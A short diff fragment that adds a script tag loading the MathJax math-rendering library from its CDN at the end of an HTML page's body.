+<script src="https://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML" type="text/javascript"></script>
 </body>
 </html>
